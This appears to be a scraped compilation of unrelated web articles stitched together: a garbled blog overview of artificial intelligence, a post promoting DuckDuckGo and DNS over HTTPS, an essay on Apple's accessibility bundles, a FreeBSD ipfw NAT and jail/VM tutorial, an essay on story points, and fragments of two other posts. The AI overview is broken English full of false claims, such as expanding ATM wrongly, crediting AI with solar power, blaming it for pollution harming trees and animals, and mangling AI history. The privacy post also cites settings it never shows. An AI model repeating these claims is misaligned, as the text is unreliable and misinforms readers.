<p>The Internet is having more popular today by <strong>Artificial Intelligence AI</strong>. So, many sellers and buyers communicating by supporting the e-commerce <a href="https://shiv1367.com/what-is-wordpress"><span>web site</span></a> or <a href="https://shiv1367.com/mobile-application-mobile-app"><span>mobile application</span></a> such as social media platforms.</p>
<p>Today, billions of people’s using Facebook, Instagram, Twitter, WhatsApp, etc. So, people do not effort more for selling and buying any product.</p>
<p>Many entrepreneurs are having to create own web site to sell the product on the internet.</p>
<p>And having encourage to sell out the product to people by using many marketing strategies like <a href="https://shiv1367.com/email-electronic-mail"><span>E-mail</span></a> marketing, Digital marketing, Content marketing, etc.</p>
<p>Economically the human is also making easy all things by The <strong>Artificial Intelligence Applications</strong>. Because many of thing is connected by the smart system such as ATM (Automatic Transaction Through Machine) is making possible the transaction between user and system.</p>
<div><figure><img src="https://shiv1367.com/wp-content/uploads/2019/05/AI2.jpg" alt="ATM (Automatic Transaction Machine)" width="691" height="518" data-src="https://shiv1367.com/wp-content/uploads/2019/05/AI2.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption><span><strong>&nbsp; &nbsp; &nbsp; </strong></span><strong>AUTOMATIC TRANSACTION MACHINE</strong></figcaption></figure></div>
<p>Netbanking is also so much helpful to people for the online transaction. Therefore, People can use the money to purchase any product on the internet.</p>
<p>AI’s given us lots of smart electric things like solar is making possible to convert the sunlight to electric current through the human’s generating more electric current from the sun. By this proceeding, the people have not felt like darkness.</p>
<h2><span id="Advantages_Of_Artificial_Intelligence"><strong>Advantages Of Artificial Intelligence</strong></span></h2>
<p>By Artificial Intelligence The human work-load decreasing. So the time has been consuming.</p>
<p>People’s having more attractive to new things. So Human is getting much effort behind AI.</p>
<p>It’s more helpful to the patient. Because today have more smart AI machine available for diseased people such as ct scanner, x-ray scanner, etc.</p>

<p>AI’s improving human life to live as easy and changing the environment of the world as beautiful.</p>
<p>Artificial Intelligence is making possible to build new things between us and improving the right to that’s a particular thing.</p>
<p>That’s been also useful in the field up meal or food and procedure of it to happen.</p>
<h3><span id="Negative_Effects_Of_Artificial_Intelligence">Negative Effects Of Artificial Intelligence</span></h3>
<p>Artificial Intelligence may have very dangerous for humans whether the error has been taken it’s maybe exploded.</p>
<p>That’s much harmful to a small or big animal as well as small aunts, dogs, cats, etc.</p>
<p>It’s increasing pollution. So the environment is being harmful to people’s be enough breath.</p>
<div><figure><img src="https://shiv1367.com/wp-content/uploads/2019/05/AI4-300x157.jpg" alt="Disadvantages Of AI" width="735" height="385" srcset="https://shiv1367.com/wp-content/uploads/2019/05/AI4-300x157.jpg 300w, https://shiv1367.com/wp-content/uploads/2019/05/AI4-768x402.jpg 768w, https://shiv1367.com/wp-content/uploads/2019/05/AI4-1024x536.jpg 1024w, https://shiv1367.com/wp-content/uploads/2019/05/AI4-390x205.jpg 390w, https://shiv1367.com/wp-content/uploads/2019/05/AI4.jpg 1200w" sizes="(max-width: 735px) 100vw, 735px" data-srcset="https://shiv1367.com/wp-content/uploads/2019/05/AI4-300x157.jpg 300w, https://shiv1367.com/wp-content/uploads/2019/05/AI4-768x402.jpg 768w, https://shiv1367.com/wp-content/uploads/2019/05/AI4-1024x536.jpg 1024w, https://shiv1367.com/wp-content/uploads/2019/05/AI4-390x205.jpg 390w, https://shiv1367.com/wp-content/uploads/2019/05/AI4.jpg 1200w" data-src="https://shiv1367.com/wp-content/uploads/2019/05/AI4-300x157.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure></div>
<p>Sometimes a big machine is more harmful. Because of the exploding of the machine may be very large by many large electrical resources.</p>
<p>It generates much risk to trees. Because poison of atmosphere It’s strict onto the fruit of trees. So human’s having got much trouble to health by that’s un-necessary objectives.</p>
<p>The human’s getting weak by AI. Because of more work done by AI machines.</p>

<p><strong>AI</strong> is important to make easy to all necessary things of humans. So, people having more attractive to the machine is making possible to all the human possibility. see more about the <a href="https://www.eolss.net/Sample-Chapters/C15/E6-44.pdf" rel="nofollow noopener" target="_blank">best definition of artificial intelligence</a>.</p>
<p>Human is putting the whole effort and thought to a machine and encouraging to the machine to make it possible according to own.</p>
<p>Human’s trying the problem to resolved and forwarding the other issue to face out. Therefore they can reach till the goal.</p>
<p>The Intelligence of humans has been important many times by large attempted to solve those issues, Thus the human is having to be more sensible.</p>
<h3><span id="AI_In_Computer_Science"><strong>AI In Computer Science</strong></span></h3>
<p>John McCarthy says AI is the science engineering to making intelligent machines or intelligent&nbsp;<a rel="noreferrer noopener" href="https://shiv1367.com/whatisprogramming" target="_blank"><span>computer programs</span></a>. It is useful for developing a computer, computer-controller, or software.</p>
<p>AI is won by the study of How Human Mind Think, How Human Learning, How Human Make Decision. Then, using study the system or&nbsp;<a rel="noreferrer noopener" href="https://shiv1367.com/whatisprogramming" target="_blank"><span>software</span></a>&nbsp;is starting to development of it.</p>
<h3><span id="Contribution_To_AI"><strong>Contribution To AI</strong></span></h3>

<p><strong>1) Gaming</strong></p>
<p>AI is getting more benefits in such kinds of games like chess, poker, tic-tac-toe, and many others. where The AI machine can make a large number of possibilities by heuristic knowledge.</p>
<p><strong>2) Natural Language Processing</strong></p>
<p>This is the best part of AI to understand the human’s speak language. It’s much tough to develop in&nbsp;<a rel="noreferrer noopener" href="https://shiv1367.com/whatisprogramming" target="_blank"><span>programming</span></a>. But, Today it is possible by human intelligence.</p>
<p><strong>3) Expert Systems</strong></p>
<p>It is good for AI to learn about the system to others. This technique is to advise the user.</p>
<p><strong>4) Vision System</strong></p>
<p>It understands the module like interpretation, comprehends visual user input on the computer or any other device. The vision system is helpful for many ways like spying, finding diagnose for a patient.</p>
<p>It’s very helpful for the police to find the location of criminals and face also.</p>
<p><strong>5) Speech Recognition</strong></p>
<p>The AI system is capable of hearing the human’s voice or language in the term of sentences and meaningful talks to it.</p>
<p>That can measure in different ways like noise in the background, human noise to cold, slang words, etc.</p>
<p><strong>6) Handwriting Recognition</strong></p>
<p>The AI software for handwriting recognization to read and write the different text on paper by a pen or screen. It can find the letter, word, and character.</p>
<p><strong>7) Robots Intelligent</strong></p>
<p>Robots are plays various role by the Artificial Intelligence system. They can detect physical data from real data like lighting, temperature, movement, sound, bump, and pressure.</p>
<p>It has many resources like sensors, effective processer, large storage.</p>
<h4><span id="History_Of_AI"><strong>History Of AI</strong></span></h4>
<p>You can see here about the history of AI from 1923 to 2000 years.</p>
<p><strong>In 1923</strong>, Karel Capek’s named “Rossum’s Universal Robots” (RUR) opened in London, 1923, the first use of the word “robot” in English.</p>
<p><strong>In 1943</strong>, development of neural networks organization.</p>
<p><strong>In 1945</strong>, Isaac Asimov, a Columbia University alumni, coined the term Robotics.</p>
<p><strong>In 1950</strong>, Alan Turing has given an introduction about TuringTest for the evaluation of artificial intelligence and published Computing Machinery. Claude Shannon.</p>
<p>He’s also published a detailed analysis of chess playing as a search.</p>
<p><strong>In 1956</strong>, John McCarthy leads the work of Artificial Intelligence. The first running of the AI program at Carnegie Mellon University in the year of 1958.</p>
<p>John McCarthy explores LISP programming language for Artificial Intelligence.</p>
<p><strong>In 1964</strong>, Danny Bobrow has a dissertation at MIT to declared that computers can think of natural language well and enough to solve algebra word problems correctly.</p>
<p><strong>In 1965</strong>, Joseph Weizenbaum at MIT in 1964 to built ELIZA, an interactive issue that carries on a dialogue in English.</p>
<p><strong>In 1969</strong>, Scientists at Stanford Research Institute built shakey, a robot, equipped with locomotion, perception, and problem-solving.</p>
<p><strong>In 1973</strong>, The Assembly robotics group at Edinburgh University develop Freddy, the famous Scottish robot, capable of using vision to locate and assemble models.</p>
<p><strong>In 1979</strong>, The first computer-controlled autonomous vehicle, Stanford cart, was built.</p>
<p><strong>In 1985</strong>, Harold Cohen created and demonstrated the drawing program, Aaron.</p>
<p><strong>In 1990</strong>, Important serve in all areas of AI:&nbsp;</p>
<p>Significant demonstrations in ML, Case-based reasoning, Multi-agent planning, Scheduling, Data mining, Web Crawler, natural language understanding and translation, Vision, Virtual Reality, Games, etc.</p>
<p><strong>In 1997</strong>, The Deep Blue Chess Program beats the then world chess champion, Garry Kasparov.</p>
<p><strong>In 2000</strong>, Interactive robot pets become commercially available.</p>
<h4><span id="Important_AI_Analytics_ways"><strong>Important AI Analytics ways</strong></span></h4>
<p><strong>Philosophy</strong>&nbsp;– Philosophy is like a logistics approach and reason to analyze the ways like How Human Knows.</p>
<p>That learns critical thinking, close reading, clear writing, and logical analysis. That helps to understand the language we use to describe the world and our place within it.</p>
<p><strong>Mathematics</strong>&nbsp;– It is the science of all Like How Human Think As Long, How Human Do Work As Far. We can say That is the process of counting, …</p></div></div>

<h3><span>What is DuckDuckGo?</span></h3>



<hr>
<p><a href="https://duckduckgo.com/">DuckDuckGo</a> is a search engine similar to Google but, with a major difference – It does not track you! In the modern era of internet where the knowledge acquired by the entire humankind is available at your fingertips, the rise of corporate and government-funded digital-tracking has become a major threat to people’s privacy.</p>
<p>Almost all major search engines including Google, Bing and Yahoo track&nbsp; you. Google most of all!</p>



<h3><span>Why and how much do they track?</span></h3>



<hr>
<p>The reason to why they track is simple – Money! Most companies that provide their product without a cost to thier users earn on the data they collected about them. The data collected about your search history, websites visited, time spent on a website, etc. is used to profile you and categorize your interests and then sold to advertisement companies to make the profit. This is the same business model that social media companies like facebook, twitter, etc. use to make money off of your data.</p>
<blockquote>
<p><strong><em>In a world with companies offering free services, the consumer becomes their product!</em></strong></p>
</blockquote>
<p>Google not only logs your search history from its search engine but also tracks your activities on various websites you visit by paying them to run their scripts on the site’s webpages.</p>



<h3><span>Don’t believe it?</span></h3>



<hr>
<p>I know it might sound like a conspiracy theory but you’d be amazed to know how easy it is to verify these claims. Simply install a plugin like uBlock Origin (<a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin">For Firefox</a> or <a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en-US">For Chrome</a>) that lets you see the domains that a website is trying to connect to from your computer and you’ll find that Google’s and Facebook’s trackers are all over the internet.</p>
<p>When you visit a website, the website’s content is downloaded to your device including HTML page, CSS styling and Java Scripts.

<p>The screenshot above is marked with a box that displays that when I visit Standard Chartered’s website, a total of 5 domains get information about my presence on that website. Of these 5 domains, the requests to sc.com and www.sc.com were partially blocked (Red Arrow marked 1), gioip-js.com and googletagmanager.com were completely blocked (Red Arrow Marked 2) and maps.googleapis.com were not at all blocked (Red Arrow Marked 3) by uBlock Origin’s default set of filters. If you’d look a little to the right of that red box, you’d notice that despite 7 requests being blocked in total (13% of all requests on that page), the website was still completely functional and that it did not break.</p>



<h3><span>What’s in it for the government?</span></h3>



<hr>
<p>Frankly, to answer this question is difficult. Sometimes, governments ask these companies to share the data to track their citizens for various reasons. Other times, the governments ask companies like Google to help identify the protestors by disclosing their mobile phone’s GPS location at the time of protests and as a <em>quid pro quo </em>they kill their competition by passing Laws to ban sites like DuckDuckGo. We can never know these answers for sure as these deals are made behind closed doors.</p>



<h3><span>So, what do I do about DuckDuckGo?</span></h3>



<hr>
<p>Well, fortunately the solution to this problem is extremely simple. You can go to the Menu section of Firefox, select Options, go to the “General” settings tab, scroll all the way to the bottom and click the “Settings” button under “Network Settings”.</p>

<p>Besides the two options provided by Firefox, you can also find a list of other HTTPS-enabled privacy-oriented DNS services on <a href="https://www.privacytools.io/providers/dns/">PrivacyTools.io – DNS</a> page.</p>



<h3><span>How Does This Solution Work?</span></h3>



<hr>
<p>To understand how this solution work, we first need to understand how does the DNS work and <a href="https://crackerscreed.org/understanding-ssl-certificates/">how does SSL certificate work</a>. Once you understand that, you’d notice the if your DNS queries are sent over HTTPS, they can only be read by the DNS server and not by your ISP’s firewall. Without reading the your DNS query, they cannot tamper or block its intended response and hence cannot block you from getting its IP address.</p>



<h3><span>Is It A Fool-Proof Solution?</span></h3>



<hr>
<p>The unfortunate answer is No! There are other ways that a government can block a website like IP address based filtering, content based filtering, etc. And even if you bypass these filters and access DuckDuckGo, by no mean you become anonymous over the internet but, switching to an actively-maintained open-sourced browser such as Firefox, installing malware/tracking blocker plugin like uBlock Origin and switching to a privacy-oriented search engine can dramatically reduce your digital footprint. It could be your first step towards a long journey of internet anonymity and digital privacy!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>apple doesn’t succeed at making their platforms accessible because they care more, they don’t succeed because they are somehow better at programming</h3>

<p>a capable, thoughtful manager, who is correctly assessing risk vs reward, both qualitatively and quantitatively, who is doing their job well, using all of the experience and skill that brought them to where they are, can, and likely will, decide to ship an app that could be accessible, but is not.</p>

<p>this is not a function of callousness (although they may also be quite callous).</p>

<p>this is not a function of engineering aptitude (plenty of our leading lights have let access fall to the wayside<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> by making solid engineering choices that are completely defensible).</p>

<p>the apple accessibility teams are made up of disciplined, brilliant engineers. they all work incredibly hard on a problem with unimaginable scale. but their brilliance and discipline and hard work, while necessary, are not sufficient.</p>

<p>what matters here, what sets apple apart, is that they figured out how to go last and contain the risk enough to avoid a revolt from other teams or executive leadership. it costs them a lot to do so, has significant, measurable downsides, and requires a significant rethink of what it means to build good software.</p>

<h3>bundles</h3>

<p>some of the code that powers accessibility on apple platforms is just disgusting to look at and to work on.</p>

<p>most of the code that makes apple software accessible lives in what’s called an accessibility bundle. without diving into the minutia of the thing, bundles are a way to load something akin to a plugin into a cocoa app at runtime if an assistive technology is activated. it involves manipulating the app or framework class hierarchy and using objective-c dynamism to read app state and build up a usable accessibility hierarchy. insert a super class here, read an instance variable there, swizzle in a method and store the state for it in associated objects.<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup></p>

<p>bundles are not a good way to build software by any common measure. they don’t make you efficient, or your code correct. the performance can get bad. they’re hard to maintain and involve constant patching to keep them alive. huge chunks of bundle code are thrown away and rewritten multiple times during every major os release.</p>

<p>i found the initial adjustment to working on this code sometimes viscerally upsetting. “i can’t do that!!”, “clearly i should be protecting against…”, “if i do it that way it’ll break when they…”, etc.</p>

<p>the thing is, critically, if a user never activates an assistive technology like voiceover they wouldn’t know bundles even exist. many of the managers at apple don’t know much or care much about accessibility. some of them are borderline hostile to it. the bundles make it possible for the accessibility team to allocate their own resources and set their own priorities with only very limited coordination and fallout contained to people who would benefit most from the upside. they allow the accessibility team to fix the bugs they find, when they find them, with pretty limited opportunities for a manager who’s next promotion is on the line to get cold feet and pull resources or block fixes.</p>

<p>in the model of low end disruption, we can see bundles as a low end entrant, with a product that seems worse, but that solves an important problem in a way that the mature products, by their nature, can’t realistically address.</p>

<p>if the job to be done is “produce easy to understand, correct, maintainable code that engineers who care about those things will enjoy working on” then bundles aren’t even in the competition.</p>

<p>if the job is “manage your team resources responsibly, keep your bug count low, ship your features on time” then bundles aren’t the tool you reach for. why would you load a squirrelly plugin into your own app on purpose?</p>

<p>the chaotic morass of runtime hacks and macros for everything and nearly exclusive dependence on runtime validation<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup> make them not just not good, but almost aggressively bad. but if the job they are hired to do is make apps that aren’t accessible, they’re incredible. unparalleled. entirely without peer.</p>

<p>almost all the things a good engineer would do to make bundles less gross would make them worse in unacceptable ways. almost anything a high end product might do to accommodate the kind of autonomy bundles demand would make them unacceptable to their current clients.<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup></p>

<p>apple has a team whose only job is to make things accessible and they have infrastructure that lets that team mostly avoid people who have a different job saying no to them. put those together and you have the most successful accessibility software team (imho) on planet earth.</p>

<h3>the gross stuff isn’t desirable, but is maybe necessary</h3>

<p>anyone who is steeped in universal design that has made it this far has maybe broken out in hives? please just stick with me, it’ll all come out in the wash.</p>

<ul>
<li>well designed apps that take accessibility into consideration from the beginning are better for everyone.</li>
<li>accessible ramps for getting into buildings are better than those terrible lifts they bolt into the sides of stairs in public buildings.</li>
<li>we all benefit from features in society that originate as accessibility affordances, like curb cuts for wheelchairs, that everyone with a stroller can now take for granted.</li>
</ul>


<p>without question these statements are true.</p>

<p>i don’t worry too much about saying things that might make people think i’m a bad engineer or have bad ideas about building software. i do care a lot about not giving people the idea that we should all knock out our accessibility code real quick and sloppy at the end as an afterthought.</p>

<p>my thesis here is that where the effect of failing is very much acute, most of us do not adjust our approach accordingly. likely because we regard assistive technology users as one of many available audiences we may or may not wish to court.</p>

<p>if we ship an app that’s inaccessible, hey we’ll get around to it, we’ve got a roadmap, hasn’t bubbled up yet, software takes time. there are so many bugs in our support tracker and “doesn’t work for blind people” is just a tiny blip.</p>

<p>of course we should be methodical and plan ahead and build our software in a way that is both accessible and maintainable. we should seek to avoid compromising, but should the need to compromise emerge, the balance should unquestionably be tilted towards gross and unmaintainable code where that is the cost of accessibility. if you could fix that missing label but eww i’d have to wire up a very clumsy chain of delegates or fire a notification that clearly violates layering, without question, you should do it.<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup></p>

<p>we should be willing to find a blend of cultural and political and technical workarounds in our organizations that acknowledge that code can’t be allowed to go out the door that isn’t accessible and that a lot of our ideas about technical excellence and what a good engineering manager does wildly miscalculate the cost of our decisions to “do it right”.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
		<p>Most of the time, I want to do some throw away networking temporally to play
with something or to try something out. I really don't like changing all the
config on a machine just to try something. The FreeBSD documentation leans the
other way first showing you what to edit in rc.conf before maybe mentioning
that actual commands to run. </p>
<p>The ipfw documentation has a different problem. The example in the handbook and
online are both very verbose and very complicated. Because ipfw is normally
configured with a shell script the authors go absolutely wild with all the
features they can.</p>
<p>I had a hard time figuring out ipfw in-kernel NAT from these guides. Instead
here I present the simplest set of commands I could find to set up a NAT and a
little explanation to help you debug when it doesn't work.</p>
<p>This is based on a great email from <a href="https://lists.freebsd.org/pipermail/freebsd-virtualization/2014-October/002998.html">Allan Jude</a> on the
freebsd-virtualization list from 2014 that laid out the basics of this setup. </p>
<h2 id="set-up-overview">Set up Overview</h2>
<p>For testing I want to run virtual machines and vnet jails on my laptop and give
them have access to the internet. I want a throw away NAT setup that is ready
to go quickly.</p>
<p>My laptop connects to my home network (and eventually the internet) over wifi.
The wifi network offers me an address in the 192.168.1.0/24 subnet. On my
laptop I want to have multiple guests. To do this we are going to use ipfw NAT
and a bridge interface. It will look something like this:</p>
<pre><code>         TO INTERNET
          ^
          |
          |
          v
          +-------+  192.168.1.x
+-------------| wlan0 |---------------+
|             +-------+               |
|                 ^                   |
|                 |                   |
|              ipfw nat               |
|                 |                   |
|                 V                   |
|            +---------+              |
| 10.0.4.1   | bridge0 |              |
|            +----+----+              |
|                 ^                   |
|                 | 10.0.4.0/24       |
|      ___________+_______________    |
|      |       |        |        |    |
|      v       v        v        v    |
|  +---+--+ +--+---+ +--+---+ +--+---+|
|  | jail | |  vm  | | jail | | ...  ||
|  +------+ +------+ +------+ +------+|
+-------------- laptop ---------------+
</code></pre><p>The interfaces in the jails (the b half of the epair) and the virtual machines
(the vtnet in the V) won't be visible to ipfw, but will exist in their own
world. To work around this we will use a bridge with the epairs and tap
interfaces.</p>
<h2 id="setting-up-ipfw-nat">Setting up ipfw NAT</h2>
<p>We need to load the kernel modules for ipfw and the ipfw in kernel NAT. ipfw
has the frustrating default (and annoyingly different to ipf and pf) of to
dening all traffic. This default has the great property of locking you out of a
machine you are setting up remotely.</p>
<p>This is control by a sysctl that cannot be changed at run time, but we can
change the default behaviour with kenv before we load the module:</p>
<pre><code># kenv net.inet.ip.fw.default_to_accept=1
</code></pre><p>Now we can safely load ipfw and the in-kernel NAT. </p>
<pre><code># kldload ipfw ipfw_nat
</code></pre><p>ipfw should load enabled, if you are having trouble later on double check that
the firewall is actually enabled.</p>
<pre><code># sysctl net.inet.ip.fw.enable
net.inet.ip.fw.enable: 1
</code></pre><p>When we do NAT we are acting as a gateway between the traffic on the NATd
interface and the real interface. For any packets to be passed we need to
enable forwarding.</p>
<pre><code># sysctl net.inet.ip.forwarding=1
# sysctl net.inet6.ip6.forwarding=1
</code></pre><h2 id="ipfw-rule-set">ipfw rule set</h2>
<p>We need to create an IPFW NAT instance configured with the interface we want to
NAT (wlan0 in this case) and configure rules to pass all traffic from the
bridge through the NAT.</p>
<pre><code># ipfw nat 1 config if wlan0
# ipfw add 101 nat 1 ip from 10.0.4.0/24 to any out via wlan0
# ipfw add 103 nat 1 ip from any to any in via wlan0
</code></pre><p>I like to leave a gap between rules like this so I can insert an ipfw log
command for the eventual case that nothing makes sense and everything is
broken.</p>
<h2 id="set-up-interfaces">set up interfaces</h2>
<p>A bridge is the center of our guest network, we will give it the default root
address that all of our guests will speak to.</p>
<pre><code># ifconfig bridge create
bridge0
# ifconfig bridge0 inet 10.0.4.1/24 up
</code></pre><p>Our jail will use an epair interface to speak to the outside world. They come
as an a and a b part, ifconfig only tells us about the a part when it clones
the interface. When we give a vnet jail an interface it is no longer visible to
the host system. An epair gives us two interfaces that act like a virtual
ethernet cable, we stick one end into the jail and the other is connected to
the bridge.</p>
<pre><code># ifconfig epair create
epair0a
</code></pre><p>Our virtual machine will use a tap interface to access the world. The tap
interface needs to be brought up. There is a helpful sysctl that is off by
default which will trigger the interface to be brought up when it is first
opened. I like to set this to one, otherwise I find myself debugging networking
inside the VM alot with little success.</p>
<pre><code># ifconfig tap create
tap0
# sysctl net.link.tap.up_on_open=1
</code></pre><p>With all the interfaces set up we need to add them to our bridge.</p>
<pre><code># ifconfig bridge0 addm epair0a addm tap0
</code></pre><h2 id="create-jail">Create jail</h2>
<p>Never spoken about is the bsdinstall jail command. It takes a directory and
installs a jail into it. This command will ask you some questions, it would be
cool if it didn't, that would make automating jail creation in scripts much
easier for me.</p>
<pre><code># mkdir testjail
# bsdinstall jail testjail
</code></pre><p>We make our jail persist so it will stick around as we experiment. The
following command creates the jail on the host:</p>
<pre><code># jail -c name=testjail persist vnet path=testjail vnet.interface=epair0b 
</code></pre><p>Now we can jexec into the jail and configure the epair. When you bring one end
of an epair up, the other end comes up, when it goes down the other end goes
down. We just need to configure an address and a default route in our jail.</p>
<pre><code># jexec testjail sh
[testjail] # ifconfig epair0b inet 10.0.4.4/24 up
[testjail] # route add default 10.0.4.1
[testjail] # ping -c 1 10.0.4.1
[testjail] # ping -c 1 192.168.1.1
[testjail] # ping -c 1 8.8.8.8
</code></pre><p>With this setup the jail can speak to our bridge, the local network and the
wider Internet.</p>
<h2 id="create-and-config-a-vm">Create and config a VM</h2>
<p>The FreeBSD offers prebuilt virtual machine images, The latest current one is
available from a url like this:</p>
<pre><code># fetch ftp://ftp.freebsd.org/pub/FreeBSD/snapshots/VM-IMAGES/13.0-CURRENT/amd64/Latest/FreeBSD-13.0-CURRENT-amd64.raw.xz
</code></pre><p>It would be cool if there was a latest symlink that gave you a new head VM from
one static place. The image comes xz compressed, we need to unpack it and I
like to move it to a consistent place:</p>
<pre><code># xz -d FreeBSD-13.0-CURRENT-amd64.raw.xz
# mv FreeBSD-13.0-CURRENT-amd64.raw /vms/freebsd-current
</code></pre><p>bhyve requires we load the vmm kernel module, with that we can use the
excellent vmrun.sh script to launch our vm.</p>
<pre><code># kldload vmm
# sh /usr/share/examples/bhyve/vmrun.sh -c 4 -m 1024 -t tap0 -d /vms/freebsd-current freebsd-current
</code></pre><p>Once that comes up you can log in and do some manual config.</p>
<pre><code>[vm] # ifconfig vtnet0 inet 10.0.4.5/24 up
[vm] # route add default 10.0.4.1
[vm] # ping 8.8.8.8
</code></pre><p>For DNS in both the jail and the virtual machines I have to manually set up the
name server local from my network.</p>
<p>/etc/resolv.conf</p>
<pre><code>search lan
nameserver 192.168.1.1
</code></pre><p>This won't be valid as I move to other networks, but I am sure I will remember
after only a little confusion and debugging.</p>
<h2 id="conclusion">Conclusion</h2>
<p>That is all it takes. The NAT configuration is 3 firewall rules and enabling
forwarding. None of this is persistent and that isn't great practice for a
production environment, but it you just want to experiment with ipfw and NAT,
or spin up a VM for today knowing how to do this in a non-persistent way is
really helpful.</p>

<p>Human beings are not very good at seeing into the future. Unless you have a crystal ball or know how to read tea leaves, trying to predict when an event will happen with any degree of accuracy is very difficult. Unfortunately, as software developers, we are regularly asked to do this. Stakeholders usually want to know when they can expect the completion of features. It can make them nervous if we tell them that we don’t know for sure, or give a timeframe that sounds worryingly large to them to account for our uncertainty.</p>

<p>Story points attempt to solve this by sidestepping time-based estimates, and focusing instead upon estimating complexity - on the basis that we are better at judging how complicated a piece of work is than how long it will take to complete.  Estimating complexity allows us to abstract away things that we can’t reasonably predict (and often throw off our predictions) such as illness and distractions, and focus on the things that we can - like whether one task is going to be bigger than another.</p>

<p>Once we have a way to quantify complexity, it is possible to begin to measure how much of it can be tackled over time - this is known as velocity. Measuring a team’s velocity allows us to build forecasts of how much work they are likely to be able to complete in the future. Note the word <em>likely</em> in that last sentence. Story points are not a silver bullet that will let you make perfect predictions about when a task will be finished - but in my experience, they are a significant step up from trying to estimate time directly.</p>

<p>They help you shift from hand-waving and guessing, to evidence-based reasoning about a teams capacity. Over time I’ve found that the accuracy of story point-based predictions tend to improve as teams gain practice and experience, and as the error in velocity averages away as more data gets added to the calculation.</p>

<p>Story points can be a contentious topic amongst software professionals; a lot have had bad experiences with them, and don’t see how they can ever help on a project. While I don’t think story points will be a good fit for <em>all</em> projects, I do believe that they can be useful on <em>a lot</em> of projects - especially when teams are inexperienced and haven’t had a chance to build up some discipline.</p>

<p>I regularly hear two objections to story points that, in my opinion, betray underlying flaws in peoples thinking rather than a problem with the technique itself:</p>

<p>Firstly: that the complexity of a task is different depending on whether you have more or less experience, often stated as ‘my points are different from your points’. Secondly: that there is ultimately no real difference between complexity and time - ‘five points is about a day, this task will take about a day, so I vote five points’.</p>

<p>The first objection is problematic because you should be estimating for the team, not individuals. If a task is going to be harder for a particular person to complete, then the team should be working with them to help. If you expect someone to struggle to complete work by themselves with no assistance when it would benefit them, then you have more significant problems on your team than estimation. It would be best if you focused on fostering collaboration and knowledge sharing before worrying about anything else.</p>

<p>The second objection is harder to help people move past.  The cognitive leap from time-based estimation, to complexity-based estimation, is quite a large one. The easiest way that I have found to help people get into the right frame of mind is by agreeing on a story to use as a reference at the beginning of estimation sessions. The question then becomes ‘how much larger is the story we are currently estimating than our reference story?’ When they don’t have a lot of experience with relative complexity, people often find ranking stories, and then fitting points to them later much more straightforward than coming up with points on the spot (as you would with planning poker).</p>

<p>With a bit of time and practice, most teams can build up an implicit understanding of how story points relate to the complexity of individual pieces of work in their backlog.  As a team becomes more practised, a satisfying moment eventually occurs: everyone’s estimates begin to converge. You know that your team is getting the hang of things when everyone is consistently voting for the same number of story points on each piece of work that comes up; and when any significant variation that occurs is the result of someone knowing something that the others haven’t considered.</p>

<p>Whether or not you use story points on your project, I think there are some ideas we can learn from them that are universally applicable. Almost all projects benefit when we can quantify changes to them over time. Reflecting upon, and learning from our experiences is a crucial part of agile development, and doing this with data can give us confidence in our conclusions, and justification for our predictions.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p id="794f">As software developers, we are a fairly unique group. For many of us, our profession is also our hobby. On the surface this is great:</p><blockquote><p id="4d9e">“Find a job you enjoy doing, and you will never have to work a day in your life.”</p><p id="8b67">― Mark Twain</p></blockquote><p id="e093">However, in reality, the inspiration for new ideas usually comes up as a side-effect of the things you do in your spare time. Needless to say, that when you program in your spare time as well as your day job, most of your ideas are about “products” aimed at other software developers.</p><p id="1a04">This gave birth to many amazing open-source projects, commercial products, as well as small and large companies built around those products.</p><p id="ff7f">Over my own career I’ve made quite a few products like that: in 2002-2003 I’ve created <a href="https://web.archive.org/web/20070430180014/http://www.spaweditor.com/en/disp.php/en_products/en_spaw/en_spaw_intro" target="_blank" rel="noopener">SPAW Editor</a> so developers can add a WYSIWYG editor to their web apps, in 2011 I started <a href="https://adduplex.com/" target="_blank" rel="noopener">AdDuplex</a> so developers can cross-promote their Windows apps, and in 2018 I made <a href="https://markerjs.com/" target="_blank" rel="noopener">marker.js</a> so developers can implement image annotation. And there were a lot of similar products and projects in-between.</p><p id="cd00">As time passed, though, from-developers-for-developers space got very well saturated. For every noun you can think of there’s a JavasScript library with that name. For every task you want to automate in your development process someone already made a tool. You are often lead (by your own [lack of] imagination) to creating an alternative for something that already exists with only marginal improvement in performance or a slightly nicer API.</p><p id="c2e9">This may be fine for those 10x-alpha-developers, as by iterating on those marginal improvements they move our industry forward. But for us mere mortal developers with impostor syndromes based in reality, the hobbyist part of our dev life got much harder. At least for me personally, coming up with useful ideas for the for-developers projects got infinitely more difficult.</p><h2 id="dceb">Enter out-of-left-field hobby</h2><p id="2b39">Earlier this year I took on an old-new hobby —learning and making music. (Check out my <a href="https://medium.com/renoob" target="_blank" rel="noopener">music-making blog here</a>).

July 1, 2020 | http://www.pathsensitive.com/2018/10/book-review-philosophy-of-software.html | <a href="https://web.archive.org/web/*/http://www.pathsensitive.com/2018/10/book-review-philosophy-of-software.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>

<p>I’m trying to read all the good writing about software design. This is very easy because not very much has been written: it turns out that it’s much easier to write an article about how to write a Tetris AI as a containerized Kotlin microservice than it is to shed insight on how to write good code. And so, when I heard about John Ousterhout’s new book “A Philosophy of Software Design,” I ordered my copy immediately.</p>

<center><img height="200" src="https://images-na.ssl-images-amazon.com/images/I/61iOSX4WNiL._SX404_BO1,204,203,200_.jpg" width="161"></center>

